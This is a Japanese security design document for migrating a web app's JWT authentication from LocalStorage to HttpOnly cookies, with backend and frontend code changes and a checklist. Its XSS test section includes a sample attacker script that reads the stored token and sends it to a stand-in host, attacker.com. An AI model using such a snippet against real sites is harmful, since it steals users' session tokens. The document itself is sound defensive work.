# 🔐 JWT認証 HttpOnly Cookie移行設計書

## 📋 概要

現在のJWT認証は**LocalStorage**と**HttpOnly Cookie**の両方を使用していますが、LocalStorage側がフロントエンドで利用されているため、XSS攻撃に対して脆弱です。

この文書では、完全な**HttpOnly Cookie ベースの認証**への移行設計を記述します。

---

## 🔍 現状分析

### 現在の認証フロー

```
[ログイン]
1. POST /api/v1/auth/login
2. バックエンド: JWT生成 → レスポンスボディ + HttpOnly Cookie両方に返却
3. フロントエンド: localStorage.setItem('itsm_auth_token', token)
4. 以降のAPIリクエスト: Authorization: Bearer <token> ヘッダーで送信
```

### 問題点

| 問題 | リスクレベル | 説明 |
|------|------------|------|
| LocalStorage使用 | 🔴 高 | XSS攻撃でトークン窃取可能 |
| トークン重複返却 | 🟡 中 | ボディとCookie両方に返却 |
| Bearer ヘッダー依存 | 🟡 中 | Cookie自動送信を活かせていない |

---

## 🎯 移行後の認証フロー

```
[ログイン]
1. POST /api/v1/auth/login (credentials: 'include')
2. バックエンド: JWT生成 → HttpOnly Cookie のみに設定
3. フロントエンド: ユーザー情報のみ保持（トークン不要）
4. 以降のAPIリクエスト: credentials: 'include' → Cookie自動送信
```

---

## 📝 実装変更一覧

### Phase 1: バックエンド変更

#### 1.1 `backend/routes/auth/login.js` 修正

```javascript
// BEFORE (現在): L64-67
return res.json({
  message: 'ログインに成功しました',
  token: result.token,  // ← 削除
  user: result.user
});

// AFTER (推奨)
return res.json({
  message: 'ログインに成功しました',
  user: result.user
  // token は HttpOnly Cookie のみ
});
```

#### 1.2 Cookie設定の強化

```javascript
// backend/routes/auth/login.js L57-62
res.cookie('token', result.token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',  // 'strict' から 'lax' に変更（外部リンクからのアクセス許可）
  maxAge: 24 * 60 * 60 * 1000,
  path: '/',
  // domain: process.env.COOKIE_DOMAIN || undefined  // 本番環境用
});
```

#### 1.3 CORS設定の更新

```javascript
// backend/server.js
app.use(cors({
  origin: [
    'http://localhost:8080',
    'http://localhost:5000',
    'https://localhost:5443',
    'https://192.168.0.187:5443',
    'https://192.168.0.187:6443'
  ],
  credentials: true  // ← 必須
}));
```

#### 1.4 認証状態確認エンドポイント強化

```javascript
// backend/routes/auth/me.js
router.get('/me', authenticateJWT, async (req, res) => {
  // Cookie から自動的に認証済み
  return res.json({
    user: {
      id: req.user.id,
      username: req.user.username,
      role: req.user.role,
      email: req.user.email
    }
  });
});
```

---

### Phase 2: フロントエンド変更

#### 2.1 LocalStorage削除

```javascript
// frontend/app.js

// BEFORE
const TOKEN_KEY = 'itsm_auth_token';
const USER_KEY = 'currentUser';
localStorage.setItem(TOKEN_KEY, authToken);
localStorage.setItem(USER_KEY, JSON.stringify(currentUser));

// AFTER
// TOKEN_KEY は不要（Cookie で管理）
// ユーザー情報はセッションストレージまたはメモリで管理
sessionStorage.setItem('currentUser', JSON.stringify(currentUser));
```

#### 2.2 API呼び出しの修正

```javascript
// BEFORE
const authToken = localStorage.getItem(TOKEN_KEY);
const response = await fetch(url, {
  headers: {
    'Authorization': `Bearer ${authToken}`,
    'Content-Type': 'application/json'
  }
});

// AFTER
const response = await fetch(url, {
  credentials: 'include',  // Cookie 自動送信
  headers: {
    'Content-Type': 'application/json'
  }
});
```

#### 2.3 ログイン処理の修正

```javascript
// frontend/app.js - login function

async function login(username, password) {
  const response = await fetch(`${API_BASE}/auth/login`, {
    method: 'POST',
    credentials: 'include',  // Cookie 受信
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ username, password })
  });

  const data = await response.json();

  if (response.ok) {
    // トークンは Cookie に自動保存されるため、ユーザー情報のみ保持
    currentUser = data.user;
    sessionStorage.setItem('currentUser', JSON.stringify(data.user));

    // 古い localStorage エントリを削除（移行期間用）
    localStorage.removeItem('itsm_auth_token');
    localStorage.removeItem('currentUser');
    localStorage.removeItem('userRole');
  }

  return data;
}
```

#### 2.4 ページリロード時の認証復元

```javascript
// frontend/app.js - initAuth function

async function initAuth() {
  try {
    // Cookie を使用して認証状態を確認
    const response = await fetch(`${API_BASE}/auth/me`, {
      credentials: 'include'
    });

    if (response.ok) {
      const data = await response.json();
      currentUser = data.user;
      sessionStorage.setItem('currentUser', JSON.stringify(data.user));
      return true;
    }
  } catch (error) {
    console.log('Not authenticated');
  }

  // 認証失敗時はログインページへ
  currentUser = null;
  sessionStorage.removeItem('currentUser');
  return false;
}
```

#### 2.5 ログアウト処理

```javascript
// frontend/app.js - logout function

async function logout() {
  await fetch(`${API_BASE}/auth/logout`, {
    method: 'POST',
    credentials: 'include'
  });

  // ローカルデータをクリア
  currentUser = null;
  sessionStorage.removeItem('currentUser');

  // 古い localStorage エントリも削除
  localStorage.removeItem('itsm_auth_token');
  localStorage.removeItem('currentUser');
  localStorage.removeItem('userRole');

  window.location.href = '/login.html';
}
```

---

### Phase 3: 影響範囲

#### 修正が必要なファイル

| ファイル | 変更内容 | 優先度 |
|---------|---------|-------|
| `backend/routes/auth/login.js` | トークンをレスポンスボディから削除 | 高 |
| `backend/server.js` | CORS credentials設定 | 高 |
| `frontend/app.js` | localStorage → credentials: include | 高 |
| `backend/middleware/auth.js` | Cookie優先の認証（既に対応済み） | - |
| `e2e/tests/*.spec.ts` | テストの認証方法更新 | 中 |

#### LocalStorage使用箇所（frontend/app.js）

```
L966: localStorage.setItem(TOKEN_KEY, authToken)
L967: localStorage.setItem(USER_KEY, JSON.stringify(currentUser))
L11551: localStorage.getItem('userRole')
L11720: localStorage.getItem('userRole')
+ 他多数の localStorage.getItem(TOKEN_KEY) 呼び出し
```

---

## 📊 移行スケジュール

| フェーズ | 期間 | タスク |
|---------|------|-------|
| Phase 1 | Day 1-2 | バックエンド変更、Cookie設定強化 |
| Phase 2 | Day 3-5 | フロントエンド全面移行 |
| Phase 3 | Day 6-7 | E2Eテスト更新、統合テスト |
| Phase 4 | Day 8+ | リフレッシュトークン実装（オプション） |

---

## ✅ 完了チェックリスト

- [ ] バックエンド: ログインレスポンスからトークン削除
- [ ] バックエンド: Cookie sameSite設定を 'lax' に変更
- [ ] バックエンド: CORS credentials: true 設定
- [ ] フロントエンド: localStorage 使用箇所をすべて移行
- [ ] フロントエンド: 全API呼び出しに credentials: 'include' 追加
- [ ] フロントエンド: ログイン/ログアウト処理更新
- [ ] テスト: E2Eテストを Cookie ベースに更新
- [ ] テスト: CORS動作確認
- [ ] テスト: XSS攻撃シミュレーション
- [ ] ドキュメント: API仕様書更新
- [ ] GitHub Issue #10 をクローズ

---

## 🔍 セキュリティ検証

### XSS攻撃テスト

```javascript
// 攻撃者スクリプト（移行前は成功、移行後は失敗）
const token = localStorage.getItem('itsm_auth_token');
fetch('https://attacker.com/steal?token=' + token);
// 移行後: token は undefined（Cookie は JavaScript からアクセス不可）
```

### CSRF攻撃対策

```javascript
// sameSite: 'lax' により、外部サイトからのPOSTリクエストではCookieは送信されない
// 追加対策: CSRF トークンの実装（オプション）
```

---

**作成日**: 2026-01-17
**担当**: セキュリティチーム
**GitHub Issue**: #10
